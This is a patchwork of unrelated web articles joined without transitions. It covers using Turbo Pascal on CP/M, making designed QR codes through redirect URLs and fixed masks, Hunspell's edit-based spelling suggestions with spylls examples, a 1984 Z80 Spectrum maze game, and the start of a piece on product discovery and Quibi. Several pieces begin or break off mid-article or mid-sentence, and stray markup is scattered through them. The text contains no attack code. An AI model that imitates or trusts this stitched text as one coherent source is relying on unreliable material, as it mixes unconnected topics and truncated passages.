<p>Press <code>S</code> for <em>Screen Installation</em> and select the appropriate terminal for your set up.  I'm using z80pack, so I select ANSI.  You probably don't want to alter this definition so say No to altering it.  Then enter the speed in Mhz of your machine.  If a suitable terminal isn't listed consult the TP manual for advice.</p>
<p>If you want to configure additional editor commands, you can do this via the <em>Command Installation</em> option.  At the very least, if you have them, you'll probably want to configure the page-up, page-down keys as well as the cursor keys to represent character-left, character-right, line-up and line-down.  If not press <code>Q</code> to quit.</p>
<h2>Usage</h2>
<p>To start the IDE run:</p>
<pre><code>B&gt; turbo
</code></pre>
<p>You should now be looking at the Turbo Pascal splash screen, showing the version, copyright message and which terminal is configured.  At the bottom you are asked whether to 'Include error messages'.  For the moment press <code>Y</code>.</p>
<p>Now you will be presented with the main screen.  You have a number of commands on this screen, which are accessed by a single letter.</p>
<p><img src="https://techtinkering.com/img/articles/turbo_pascal_cpm_main.png"></p><p>To work with a pascal source file, first press <code>W</code> and then enter a filename.  This is the file that the editor will open and it is also the file that the compiler will compile if you haven't selected a main file.</p>
<p>To edit the work file, press <code>E</code>.  The editor uses Wordstar key combinations which you can read more about in the manual.  For now the following keys will be useful to know:</p>
<table>
  <tbody><tr><th>Key command</th><th>Action</th></tr>
  <tr><td>CTRL-s</td><td>Character Left</td></tr>
  <tr><td>CTRL-d</td><td>Character Right</td></tr>
  <tr><td>CTRL-e</td><td>Character Up</td></tr>
  <tr><td>CTRL-x</td><td>Character Down</td></tr>
  <tr><td>CTRL-k s</td><td>Save Document</td></tr>
  <tr><td>CTRL-k d</td><td>Quit</td></tr>
</tbody></table>
<p>You can also use any keys that you configured above with the <em>Command Installation</em> option in <code>tinst</code>.</p>
<p>Files are edited in memory so to save them to disk you press <code>S</code> from the main menu.</p>
<p>To compile and run the work file, or main file if selected, press <code>R</code>.  Depending on what is set in the compiler options, this will either compile to a <code>com</code> file or will compile to memory.</p>
<h3>Hello, world!</h3>
<p>To try this with the traditional 'Hello, world!' program, set the work file to <code>hello.pas</code>, edit the file and enter the following, then quit the editor.</p>
<pre><code>program helloworld;
begin
  writeln('Hello, world!');
end.
</code></pre>
<p>Compile and run it by pressing <code>R</code> from the main menu.  You should see it compile and then say hello to the world.</p>
<h2>Video</h2>
<p>The following video shows the creation of a FizzBuzz program using Turbo Pascal and allows us to see just how quick and easy it is.</p>
<p>
  <iframe width="560" height="315" src="https://www.youtube.com/embed/acYu0sL9Ol0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>
<p>The source code for <code>fizzbuzz.pas</code> used in the video is as follows:</p>
<pre><code>program fizzbuzz(output);
var
  i: integer;
begin
  for i := 1 to 100 do
  begin
    if i mod 15 = 0 then
      write('FizzBuzz ')
    else if i mod 3 = 0 then
      write('Fizz ')
    else if i mod 5 = 0 then
      write('Buzz ')
    else
      write(i, ' ');
  end
end.
</code></pre>

<p>Get the <a href="http://bitsavers.trailing-edge.com/pdf/borland/turbo_pascal/Turbo_Pascal_Version_3.0_Reference_Manual_1986.pdf">Turbo Pascal 3.0 Manual</a> for CP/M-80, CP/M-86 and PC-DOS/MS-DOS from <a href="http://bitsavers.org/">bitsavers.org</a>.  It is a wonderfully well-laid out manual and you should have no problems using this to learn and get the most out of Turbo Pascal.  You may also want to take a look at a copy of the old Borland musuem page: <a href="http://edn.embarcadero.com/article/20792">Antique Software: Turbo Pascal v3.02</a>.</p>
<p>You are now ready to use Turbo Pascal to write and compile applications like it was 1986.</p>

          <p><b>Check out <a href="https://my-qr.art/">My-QR.art</a> for the final result!</b></p>

          <p>QR codes provide a clear and approachable way of translating the physical world to the
          digital world. When I see a QR code, I always want to scan it to find out what is behind
          it, somehow they always fascinate me. But QR codes always look very similar, could there
          be a way to make them look more cool? Make them a certain specific shape or contain pixel
          art?</p>

          <p>People already (ab)use the error correction build into QR codes to embed their logo
          in it, they simply put their logo over a part of the QR code and let the error correction
          handle the missing data. However, you can never obscure more than 30% of the code (and
          usually a lot less) if you choose this approach. But QR codes are mostly a visualisation
          of data. Can we approach the problem from the other side? What if we don't try to
          design a QR code to fit the data, but fit the data to the design of the QR code that we
          want.</p>

          <p>Spoiler, we can. Check out <a href="https://my-qr.art/">My-QR.art</a>. All the code is
          totally free and open source, so feel free to
          contribute <a href="https://github.com/raatmarien/my-qr.art">on GitHub</a></p>

          <h2 id="the-idea">The idea</h2>

          <p>Say, we want to promote our website. And we have a nice grayscale logo. Now we want to
          have an engaging QR code that looks like our logo.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/my-qr.art-logo.svg" alt="My-QR.art logo"></p><p>And we have an URL that we want the QR code to lead us too, for
            example: <a href="https://my-qr.art/">https://my-qr.art</a>.</p>
          
          <p>We set up a web server that can redirect certain URLs to other URLs. Then we can make
          the beginning of the data of our QR code the URL to that web-server and the rest of the
          QR's data can be anything. So we can choose the rest of the data in any way that makes
          our QR code look most like our design!</p>

          <p>For example the QR code could send you
            to <code>https://my-qr.art/r/arbitrary-super-long-string</code>. On the back-end we tell
            the server to redirect any request with the
            URL <code>https://my-qr.art/r/arbitrary-super-long-string</code>
            to <code>https://my-qr.art</code>. And tada! We have a functional QR code that sends us to
            the address we want, while having way more control over how the QR code looks! Up to 80%
            of the code can be freely designed this way!</p>

          <p>When we have this all working, we could even make nice scannable QR gifs. We could make
          each frame separately and let them all redirect to the same page. I admit, most QR codes
          are printed, so gifs might not make the most sense, but they look pretty cool! To keep you
          excited for the rest of the article, here is world's first ever working QR gif (as far
          as I know)!</p>
          
          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr.gif" alt="Animated QR code that shows a running horse"></p><p><a href="https://en.wikipedia.org/wiki/The_Horse_in_Motion">The running horse might
          remind you of some other movie...</a></p>

          <h2 id="qr-codes">How does QR work?</h2>

          <p>Now that we know the concept, lets get started. First we need to know how QR codes
          actually work.</p>

          <p>QR codes encode data by making some blocks dark and other light. The QR scanner can
          then read which are dark and which are light and reconstruct the original data. QR codes
          can have 40 different sizes, from <em>version 1</em> (very small, 17x17) to <em>version
          40</em> (very big, 177x177). QR codes are made of black and white 'modules' and
          each module has one of the following 4 functions:</p>

          <ol>
            <li>Help the scanner recognise and orient the QR code</li>
            <li>Give information about the QR code size, type and other internal QR stuff</li>
            <li>Encode the actual data that the QR code represents</li>
            <li>Encode error correction info about the QR code</li>
          </ol>

          <h2 id="drawing">Creating a template</h2>

          <p>Our plan is to allow the user to choose the colour of any module that has function 3. So
          the first step is to let the user know which pixels they can control and which pixels they
          can't control for the QR code size they chose. For now lets try to create an image on
          which the modules with function 3 are coloured white and all other modules are coloured
          grey.</p>

          <p>For this we can colour all the modules and error data. To get this right you really need
          to dive into how QR codes work. We need to think about the data encoding, interleaving,
          extra eyes, error words and more. We'll also need to take into account that we'll
          need to reserve first few characters of our data for the start of our URL. Luckily there
          is a great source on QR codes on the
          internet, <a href="https://www.thonky.com/qr-code-tutorial/introduction">the QR code
          tutorial from Thonky.com</a>. Putting the work in, we get something like this, for version
          30.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-template.png" alt="A template for a QR design"></p><h2 id="reading">Reading a design</h2>

          <p>Now let's work on the other side of the puzzle, when we have a design that a user
          has drawn on our template, how do we convert it to a working QR code? QR codes have 4
          possible types of encoding: <em>numeric</em>, <em>alphanumeric</em>, <em>binary</em>
          and <em>kanji</em>. We need something that we can create valid URLs with, so numeric and
          kanji are out. Secondly, we need the random string at the end of our URL to
          be <em>normal</em> enough so that QR scanners will still recognise our code as an
          URL. The <em>binary</em> encoding will create characters that aren't ordinarily found
          in URLs ('\0' for example), which means lots of QR scanners won't let their
          users open our URL. Luckily the <em>alphanumeric</em> encoding has just enough characters
          to let us make valid URLs (although they'll have to be all caps).</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-design.png" alt="A design for a QR code that contains the My-QR.art logo">

          <img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-data-order.png" title="Made by Thonky, shared under the CC ANC 4.0" alt="An illustration from Thonky.com that shows how data is encoded in a QR code"></p><p>So with that figured out, lets read that design the user made. First we'll extract
          a bit string from all the data modules in the design. For small QR codes this is quite
          straight forward, the QR code is simply read from right to left, bottom to top and back
          again in double columns, see the illustration from Thonky above. However, when the QR code
          size passes 5, we'll have to take into account interleaving. Then the data words are
          scattered around the QR code, presumably to make the data pattern more random. So
          we'll have to reverse that interleaving procedure. Luckily how it works is explained
          by <a href="https://www.thonky.com/qr-code-tutorial/error-correction-coding">Thonky.com</a>. At
          last we get a bit string from our design, here we only show the first 80 character, the
          real bit string for this design is 13863 bits long.</p>
          <p><code>01100011010101001100101010001100011110111010100000000001110100111110011101001001</code></p>

          <h3 id="decoding">Decoding the bitstring</h3>
          <p>Now we'll need to decode the bits to an alphanumeric string. Here we group 11 bits
          together every time and then convert that into two alphanumeric characters
          using <a href="https://www.thonky.com/qr-code-tutorial/alphanumeric-table">this
          table</a>. We get the following data string (again truncated).</p>

          <p><code>KS$#LKAHRDF9H8XQI9AL HRD$OIWHSRE94QX95IFR*IK9HF/ 5NM+/AMIA99LB I5R II98ULR JRD/AR1 IRG8...</code></p>

          <p>We'll just replace the first 20 characters with our URL prefix and we get:</p>

          <p><code>HTTPS://MY-QR.ART/R/ HRD$OIWHSRE94QX95IFR*IK9HF/ 5NM+/AMIA99LB I5R II98ULR JRD/AR1 IRG8...</code></p>

          <h3 id="qr-code">Generating the QR code</h3>

          <p>Now we can use any QR library to create the QR code! The QR library will handle adding
          all the difficult error codes and other boring stuff for us.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/failed-qr.png" alt="A random looking QR code"></p><p>But what is that? Why does it still look all random? The problem is masking. The QR
          code spec includes 5 different masks and the mask that makes the QR code look most random
          is chosen, which is almost certainly not our design. This is done to make the code easier
          to read for scanners. However, in my experience, QR codes scan just fine with more
          structured data. So we don't have to feel too bad about modifying our QR library to
          always use the same mask. Then after we apply the same mask to our design before
          processing it, we finally get the desired image.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/my-qr.art-qr.png" alt="A QR code with the design in it"></p><h2 id="redirecting">Redirecting the request</h2>

          <p>Now to redirect the QR code to the right domain. This should be easy, put the QR URL in
          a database and link it to the redirect URL. When we receive a request, simply look up the
          corresponding URL in a database. However, if we want to use a modern web server, we'll
          have to jump through some hoops... Apache doesn't like most of our URLs, since they
          are technically malformed (ugh, spoil the fun much Apache?). So it throws an <em>Error
          400: Bad request</em>. We can't disable this error anywhere it seems. However, luckily
          there is a workaround, we can set a custom error page for our <em>Error 400</em>, so if we
          just set the redirect page as the error page for <em>Error 400</em>, we are home free!
          Luckily Apache is not so much of a spoilsport that it throws a Bad Request error while
          trying to handle a Bad Request...</p>

          <p>For the back-end I've been using Django, and it has another fun bug that shows up
          with these really weird URLs. It tries to decode the URL as an ISO-8859-1 string, but some
          of the characters passed by Apache aren't in ISO-8859-1. So we have to derive our own
          WSGI handler to workaround
          this, <a href="https://github.com/raatmarien/my-qr.art/blob/main/my_qr_art/custom_wsgi.py">see
          here</a>. But now it works, try to scan the QR we made, it redirects where we want it to
            redirect!</p>

          <p>One small caveat though, QR codes themselves are standardized and we create standard
          compliant QR codes with correct URLs in them, but QR scanners aren't standardized and some
          might not recognize our code as a URL and will see it as plain text instead.</p>

          <h2 id="a-web-app">Custom QR codes for everyone!</h2>

    <p><strong><em>This is the fifth part of the “Rebuilding the spellchecker” series, dedicated to explaining how the world’s most popular spellchecker Hunspell works.</em></strong></p>

<p>Today, we talk about <strong>edit-based suggestions.</strong></p>

<p><strong>Quick recap</strong>: <strong><a href="https://zverok.github.io/blog/2021-01-05-spellchecker-1.html">The first part</a></strong> described what Hunspell is; and why I decided to <a href="https://github.com/zverok/spylls">rewrite it in Python</a>. In <strong><a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">the second</a></strong> and <strong><a href="https://zverok.github.io/blog/2021-01-14-spellchecker-3.html">the third</a></strong> parts, we’ve talked about <strong>lookup</strong>: checking the word’s correctness.</p>

<p><strong><a href="https://zverok.github.io/blog/2021-01-21-spellchecker-4.html">The fourth part</a></strong> introduced <strong>suggest</strong>, an algorithm for search for corrections. We described that Hunspell performs suggest in two main stages:</p>

<ol>
  <li>Generate edits and test them for the correctness</li>
  <li>(If the first stage didn’t produce good enough results) Search through the entire dictionary and find similar words</li>
</ol>

<p>So, speaking about the <strong>edit-based suggestions search</strong>: its full behavior is a curious example of emergent complexity. Every single step and every single condition is quite simple, but the resulting behavior is quite sophisticated—and hard to dissect.</p>

<p>Let’s dive into this beautiful mess!</p>

<blockquote>
  <p>Before we proceed, let’s try something new: in this chapter, I’ll show some spylls code to play with and illustrate some points. So, if you want to follow, begin with:</p>
</blockquote>



<blockquote>
  <p>…and load spylls into your REPL of choice:</p>
</blockquote>

<div><div><pre><code>  <span>from</span> <span>spylls.hunspell</span> <span>import</span> <span>Dictionary</span>

  <span>english</span> <span>=</span> <span>Dictionary</span><span>.</span><span>from_files</span><span>(</span><span>'en_US'</span><span>)</span>
</code></pre></div></div>

<blockquote>
  <p>To simplify experimenting, a few dictionaries used in examples are distributed with spylls. Other dictionaries to play with can be downloaded from <a href="https://addons.mozilla.org/en-US/firefox/language-tools/">Firefox</a> or <a href="https://extensions.libreoffice.org/?Tags%5B%5D=50">LibreOffice</a> extension sites.</p>
</blockquote>

<blockquote>
  <p>Once the dictionary is loaded, you can use suggest:</p>
</blockquote>

<div><div><pre><code>  <span># this will return suggestion generator
</span>  <span>print</span><span>(</span><span>english</span><span>.</span><span>suggest</span><span>(</span><span>'spylls'</span><span>))</span>
  <span># &lt;generator object Dictionary.suggest at 0x7f62e972d950&gt;
</span>
  <span># ...and this will unpack it into suggestions
</span>  <span>print</span><span>(</span><span>*</span><span>english</span><span>.</span><span>suggest</span><span>(</span><span>'spylls'</span><span>))</span>
  <span># spells spills
</span>
  <span># For illustrative purposes, there is also an
</span>  <span># easy-to-use internal method, that produces
</span>  <span># Suggestion objects with an indicator of the
</span>  <span># method it was found with.
</span>  <span>print</span><span>(</span><span>*</span><span>english</span><span>.</span><span>suggester</span><span>.</span><span>suggestions</span><span>(</span><span>'spylls'</span><span>))</span>
  <span># Suggestion[badchar](spells)
</span>  <span># Suggestion[badchar](spills)
</span></code></pre></div></div>

<h2 id="the-order-of-edits">The order of edits</h2>

<p>As we already mentioned, the “classic” edits for string comparison algorithms are insert, delete, replace, and swap adjacent letters. To contrast, Hunspell’s carefully crafted set of edits is as follows:</p>

<ol>
  <li>Change the word to the uppercase (see also “Word case” sub-section below);</li>
  <li>Replace common misspellings, like “f”→”ph” and vice versa, defined by <code>REP</code> table from aff-file;</li>
  <li>Split the word in two parts in every position (with space or dash), to be tested as a <em>single dictionary entry</em>, like “ad hoc” (see also #13 below);</li>
  <li>Replace related chars, like “a”, “å”, “ä”, defined by <code>MAP</code> table from aff-file;</li>
  <li>Swap every two adjacent letters,
    <ul>
      <li>oh, and for 4- and 5-letter words also try <em>two</em> swaps: “ahev” → “have”;</li>
    </ul>
  </li>
  <li>Swap two non-adjacent letters (up to distance 4);</li>
  <li>Replace every letter with the adjacent on the keyboard, e.g. “miraclw” → “miracle”. The keyboard layout is defined by <code>KEY</code> directive in aff-file;
    <ul>
      <li>and, on the same step, with the capitalized version of the character (“paris” → “Paris”, but not vice versa), also considered as a possible keyboard-related error;</li>
    </ul>
  </li>
  <li>Remove every letter in turn;</li>
  <li>Insert every letter from the language’s alphabet (defined by <code>TRY</code> directive in aff-file) into every position;</li>
  <li>Move every letter forward and backward into all possible positions;</li>
  <li>Replace every letter with every other letter from the language’s alphabet;</li>
  <li>Find a duplicated <em>pair</em> of letters and remove it: “chicicken” → “chicken”;</li>
  <li>Split the word in two in every position, to be tested as two separate words (see also #3 above).</li>
</ol>

<p>Phew!</p>

<p>As <del>complicating matters is kinda Hunspell’s shtick</del> there are many edge cases to handle, producing edits in some order is just the beginning!</p>

<h3 id="suggestion-ranking-and-limiting-is-hard-coded">Suggestion ranking and limiting is hard-coded</h3>

<p>Classical spellchecker algorithm papers typically describe the process of ranking of suggestion after they are generated: by edit’s probability, by similarity to the original word, or by word’s popularity. In Hunspell, the ranking is <em>implicit</em>: the order of steps is already considered the best possible order.</p>

<p>So, all suggestions to remove a letter that produce correct words (step 8) will be returned before all suggestions to insert a letter (step 9)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>:</p>

<div><div><pre><code><span>print</span><span>(</span><span>*</span><span>english</span><span>.</span><span>suggester</span><span>.</span><span>suggestions</span><span>(</span><span>'haz'</span><span>))</span>
<span># Suggestion[extrachar](ha)       # all "extra character removed" suggestions
# Suggestion[forgotchar](haze)    # then, all "forgotten character inserted"
# Suggestion[forgotchar](hazy)
# Suggestion[badchar](has)        # then, all "bad character replaced"
# Suggestion[badchar](hat)
# Suggestion[badchar](had)
# &lt;...skip, there are lots...&gt;
# Suggestion[twowords](ha z)      # finally, all "should be split in two words"
# Suggestion[twowords](ha-z)
</span></code></pre></div></div>

<p>The number of edit-based suggestions is hard-limited to 15. Even if there’s a possibility to produce more, Hunspell does not attempt to balance the number of suggestions from each group: it just stops searching for more after the first 15, no matter how they were produced.</p>

<p>There is also a hard cut-off by certain categories of suggestions: if (3) produces a correct word, no further edit-based and no ngram-based suggestions are tried; if any of (1-2) produce correct words, the rest of edit-based suggestions are produced too, but no ngram suggestions are produced.</p>

<p>Finally, there is a hard cut-off by time: 0.25 seconds for a whole suggestion algorithm, 0.1 seconds for each approach to edit-based algorithm (in each possible word case): once the time limit is reached, the suggestion generation stops. (Spylls doesn’t try to reimplement this, as Python is obviously slower than C.)</p>

<blockquote>
  <p>Contrast this rigid ordering/limiting to aspell’s approach: it provides several <a href="http://aspell.net/0.61/man-html/Notes-on-the-Different-Suggestion-Modes.html">suggestion modes</a>, allowing to trade time for breadth or vice versa; and also has a lot of <a href="http://aspell.net/0.50-doc/man-html/4_Customizing.html">fine-tuning options</a> to adjust this behavior.</p>
</blockquote>

<h3 id="non-lowercase-words-increase-the-number-of-searches">Non-lowercase words increase the number of searches</h3>

<p>What if the misspelling is not in the same case as the desired correction is in the dictionary? The answer (as one who already has some gist of this series might imagine) is complicated.</p>

<p>Lowercase word that should be capitalized will be fixed relatively easy, on step (7):</p>

<div><div><pre><code><span>print</span><span>(</span><span>*</span><span>english</span><span>.</span><span>suggester</span><span>.</span><span>suggestions</span><span>(</span><span>"london"</span><span>))</span>
<span># [Suggestion[badcharkey](London)]
</span></code></pre></div></div>

<p>The word that should’ve been uppercased will be fixed even easier, on step (1):</p>

<div><div><pre><code><span>print</span><span>(</span><span>*</span><span>english</span><span>.</span><span>suggester</span><span>.</span><span>suggestions</span><span>(</span><span>"nasa"</span><span>))</span>
<span># Suggestion[uppercase](NASA)
# Suggestion[forgotchar](nasal)
</span></code></pre></div></div>

<p>But when the misspelling is not in the lowercase (and the target spelling is), the wonders begin. The word is transformed to all cases it <em>could</em> have been if it was spelled correctly; then, for each of the variants, steps 1-13 run, then the final suggestions are capitalized back into the original form of the misspelling<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>. For example, let’s misspell a kitten.</p>

<div><div><pre><code><span>print</span><span>(</span><span>*</span><span>english</span><span>.</span><span>suggester</span><span>.</span><span>suggestions</span><span>(</span><span>"Kittn"</span><span>))</span>
<span># Suggestion[badchar](Kitty)     |
# Suggestion[twowords](Kit tn)   | Three edit suggestions from "Kittn"
# Suggestion[twowords](Kit-tn)   |
#
# Suggestion[forgotchar](Kitten) | Edit suggestion from "kittn",
#                                | capitalized after it was found
</span></code></pre></div></div>

<p>Note that, again, suggestions are <em>not</em> reordered: the user receives them in the order they were found.</p>

<h3 id="aff-file-contents-affects-quality-dramatically">Aff-file contents affects quality dramatically</h3>

<p>One might notice that descriptions of some steps refer to the <strong>data defined in aff-file</strong>. It means that some of what is perceived as a suggest <em>algorithm</em> is actually represented by <em>data</em> and is delegated to the dictionary’s maintainer.</p>

<p>Some of the directives are hard to populate—for example, <code>REP</code>, the list of commonly misspelled letter groups (“f/ph”, or “tion/shun”). Many dictionaries omit it or make a very small list, missing the opportunity to cover the most important mistakes. Other directives (like <code>KEY</code> or <code>TRY</code>) are quite trivial and yet are not included in some dictionaries, leading to a sharp drop in suggestion quality.</p>

<p>We’ll discuss dictionaries and their quality in one of the future chapters. For now, just one telling example.</p>

<p>To perform steps like “insert a missing letter” or “replace a letter with another,” Hunspell needs to know <em>the language’s alphabet</em>. Being truly multi-lingual, it can’t assume regular Latinic <code>a-z</code> as a default. So, there is a <strong><code>TRY</code> directive</strong>, which should specify this alphabet. If it is absent,  several of the important steps would be missing<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>.</p>

<div><div><pre><code><span>russian</span> <span>=</span> <span>Dictionary</span><span>.</span><span>from_files</span><span>(</span><span>'ru_RU'</span><span>)</span>
<span># "кошка" is "female cat", "коша" is informal name/misspelling for it:</span>
<span>print</span><span>(</span><span>"кошка"</span> <span>in</span> <span>russian</span><span>.</span><span>suggest</span><span>(</span><span>'коша'</span><span>))</span> <span># "к" is missing</span>
<span># False</span>
<span>print</span><span>(</span><span>"кошка"</span> <span>in</span> <span>russian</span><span>.</span><span>suggest</span><span>(</span><span>'тошка'</span><span>))</span> <span># "к" is replaced with "т"</span>
<span># False</span>

<span># Let's fix it!</span>
<span>russian</span><span>.</span><span>aff</span><span>.</span><span>TRY</span> <span>=</span> <span>'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'</span>

<span>print</span><span>(</span><span>"кошка"</span> <span>in</span> <span>russian</span><span>.</span><span>suggest</span><span>(</span><span>'коша'</span><span>))</span>
<span># True</span>
<span>print</span><span>(</span><span>"кошка"</span> <span>in</span> <span>russian</span><span>.</span><span>suggest</span><span>(</span><span>'тошка'</span><span>))</span>
<span># True</span>
</code></pre></div></div>

<blockquote>
  <p><strong>Note:</strong> In fact, using the alphabetic order of letters to fix the issue is too naive. Hunspell’s documentation advises sorting letters in <code>TRY</code> in the order of frequency (they’ll be actually <em>tried</em> in the order they are specified). Also, we forgot to include <code>-</code> (dash) into the alphabet—which will lead to omitting of all “(good word)-(another good word)” suggestions.</p>
</blockquote>

<h3 id="multiword-suggestions-are-cumbersome">Multiword suggestions are cumbersome</h3>

<p>One of the most common spelling mistakes is <strong>accidentally joining two words</strong>: so, every good spellchecker should try to cover this case. Unfortunately, it is frequently overlooked in spellchecking libraries and algorithm explanations (everybody focuses on the distance between one misspelling and one suggestion)<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>.</p>

<p>Usually, we want split suggestions at the end of the suggestion list (thus, the last step). Otherwise, short words will overwhelm the user with possibilities:</p>

<div><div><pre><code><span>[</span><span>*</span><span>en</span><span>.</span><span>suggester</span><span>.</span><span>suggestions</span><span>(</span><span>'Itall'</span><span>)]</span>
<span># Suggestion[extrachar](Tall)
# Suggestion[extrachar](Ital)
# Suggestion[badchar](Stall)
# Suggestion[badchar](Italy)
# Suggestion[twowords](I tall)
# Suggestion[twowords](It all)
# ...
</span></code></pre></div></div>

<p>Sometimes, though, we might want to ensure that some …</p></article></div>

        <h2>James O'Grady plays, reviews and mods (!) a game I wrote in Z80 machine code in 1984</h2>
    </header>

    <section>
      <p><img src="https://jamesmead.org/images/graphic-adventures-for-the-spectrum-48k.jpg" alt="Book cover for 'Graphic Adventures for the Spectrum 48K'"></p>

<p>I recently stumbled across <a href="#the-youtube-video">a quirky Youtube video</a> which piqued my interest. In the video <a href="https://twitter.com/JAMOGRAD">James O'Grady</a> demonstrated a 3D maze game. He'd typed in the code for the game from a familiar-sounding book called <a href="https://www.amazon.co.uk/dp/0744700132">Graphic Adventures for the Spectrum 48K</a>.</p>

<p>The nominal author of this book, Richard Hurley, was one of my teachers and he included programs written by me and a number of my friends. The 3D maze game was one I wrote in about 1984 when I was 16. In the video James goes on to critique the game, to explore some ways to improve it, and to read some reviews of the book from magazines of the time.</p>

<p>In my early teens I played a lot of games on the ZX81 and then the Spectrum, but as I got older I became bored of playing the games and more interested in writing them. I learnt a lot about programming games from typing in code from magazines and books.</p>

<p>The first games I developed were written entirely in <a href="https://worldofspectrum.org/ZXBasicManual/">Sinclair BASIC</a>, e.g. <a href="https://github.com/floehopper/sub-hunt">Sub Hunt</a> which was published in <a href="https://spectrumcomputing.co.uk/index.php?cat=96&amp;id=2000461">an earlier book</a>, but I quickly realised I would need to use machine code to get the performance I wanted. Initially I wrote small bits of machine code to speed up critical bits of the games. However, the 3D Maze game in the video was the first game I wrote pretty much entirely in Z80 machine code using the excellent <a href="https://en.wikipedia.org/wiki/Zeus_Assembler">Zeus assembler</a> and with my trusty copy of <a href="https://archive.org/details/CompleteSpectrumROMDisassemblyThe">The Complete Spectrum ROM Disassembly</a>. It was closely based on the "3D Monster Maze" game by J.K. Greye Software.</p>

<blockquote>
  <p>
    Most importantly, from the point of view of video game history, the ZX81 was the computer which hosted the world's first ever 3D game on a home computer - JK Greye's 3D Monster Maze. A simple labyrinth is generated, and the player has to find their way out, all the while being stalked by a Tyrannosaurus Rex. The whole experience was rendered in what is now referred to as 'first person' view - ie, you see what you would see out of the eyes of the character in the maze, as pictured in the ZX81's rather blocky but still effective graphics. A quick play of this game on an emulator is recommended to all fans of Doom, Quake, Unreal, Half Life and all the other FPSs which are now so popular, as it really is the literal grandaddy of them all. It is difficult now to describe the impact this game had on a public who had quite literally never seen anything like it.

<h3 id="my-version">My version</h3>

<p>One slight disappointment was that unlike in "3D Monster Maze" there was no "monster" in my version of the game or at least not in the version James was playing. I know that I did eventually add a Tyrannosaurus Rex to the game, but I vaguely remember having to rush for a publication deadline, so the monster might've have missed the cut! If I recall correctly, a friend with better artistic skills than me drew a T Rex in a series of "frames" walking towards the observer. I then traced the drawings onto graph paper and converted them into <a href="https://en.wikipedia.org/wiki/ZX_Spectrum_character_set">user-defined graphic characters</a>. I do half wonder whether these might be the mystery bytes which James refers to at one point in his video. Otherwise I believe the program uses calls to the ROM, e.g. <a href="https://speccy.xyz/rom/asm/24b7">this line-drawing subroutine</a>, to draw the walls of the maze.</p>

</p>

<h3 id="the-youtube-video">The Youtube video</h3>

<p>James must've been incredibly patient to type in all the raw numbers for the machine code with only very rudimentary checksums. And, given that the game is written entirely in machine code and the assembler source code is lost in the mists of time, I was impressed that James managed to successfully modify the game in a couple of different ways using a load of judicious <a href="https://en.wikipedia.org/wiki/PEEK_and_POKE"><code>PEEK</code>s and <code>POKE</code>s</a> and apparently without the use of a disassembler. In particular he's written a nice maze editor program which runs on the Spectrum and allows you to design your own maze. I was quite amused to learn that the maze had to be square - I can't imagine it would've been much harder for me to have allowed rectangular ones!</p>

<p>James is very fair in his criticisms of the game - his main observation is that it's not very interesting to play, but it is very fast compared to other similar games. I also enjoyed reading the reviews of the book he'd found in a couple of magazines of the time. I had a lovely exchange with him in <a href="https://www.youtube.com/watch?v=Q656CqMIXLY&amp;lc=UgzsXaL19aLWF7T3qCp4AaABAg">the Youtube comments</a> and he <a href="https://twitter.com/JAMOGRAD/status/1351920870621589506">changed the title</a> of the Youtube video to include my name which was a nice gesture. Anyway, this was a brilliant trip down memory lane for me and reminded me of my programming roots!</p>

<h3 id="playing-the-game">Playing the game</h3>

<p>If you feel as if you want the full "type it in" experience, the Portuguese (!) version of the book is available for <a href="https://archive.org/download/World_of_Spectrum_June_2017_Mirror/World%20of%20Spectrum%20June%202017%20Mirror.zip/World%20of%20Spectrum%20June%202017%20Mirror/sinclair/books/g/GraphicAdventuresForTheSpectrum48K(AventurasGraficasParaOSpectrum48K)(TemposLivres).pdf">download</a> from <a href="https://spectrumcomputing.co.uk/index.php?cat=96&amp;id=2000168">Spectrum Computing</a> and you can find the game in "Labirinto" (chapter 4, page 105). Otherwise, <a href="https://github.com/floehopper/3d-maze">this GitHub repo</a> includes a set of <a href="https://worldofspectrum.org/faq/reference/formats.htm#TAP">TAP format</a> files which might work in a Spectrum emulator, although I haven't yet had a chance to try them myself.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>To explain the idea of ‘product discovery’, we can learn a lot from the story of Quibi. <br><a href="https://quibi.com/" target="_blank" rel="noopener">Quibi</a>, a new streaming service designed for mobile phones, launched on April 6th, 2020. In a crowded market full of big-name competitors like Netflix, Amazon Prime, and Disney Plus, Quibi differentiated its product by offering high-quality, professionally made TV shows tailored for on-the-go viewing. Each piece of content was 10 minutes or less and optimized for both vertical and horizontal full-screen dimensions.</p><p>Because its co-founders were already so successful in both Hollywood and business, Quibi raised almost $2billion prior to launch. They commissioned top talent to create exclusive content. The app itself was well-designed and easy to use. Switching from vertical to horizontal full-screen worked seamlessly, and felt like a genuinely unique feature.</p><p>But on October 22nd, 2020, Quibi shut down with hardly any users—just six months after launching. An article by <a href="https://www.theverge.com/2020/10/22/21528404/quibi-shut-down-cost-subscribers-content-tv-movies-katzenberg-whitman-tiktok-netflix" target="_blank" rel="noopener">The Verge</a> lists some reasons behind this, from the global pandemic to simply bad content. Above all, the author picks out one factor as decisive: “a lack of insight into consumer behavior, wants, and needs.”</p><p>“Quibi didn’t work because no one at Quibi knew what it should be, what people wanted, or how people use their phones. Its entire thesis is wrong.”</p><p>In other words, Quibi didn’t fail because of flaws in the final product or bad user experience—it failed as an <em>idea</em> for a product. The way to avoid this? Product discovery.</p></div><p id="what"><h2>What is product discovery?</h2></p><div><p>Product discovery is the process of closely understanding what your users’ problems and needs are, then validating your ideas for solutions before starting development. By forming a close relationship with your users and letting them guide your design thinking, your overall product strategy is much more likely to end up solving real-user problems.</p><p>The idea of product discovery was originally developed in the 90s, when many of today’s 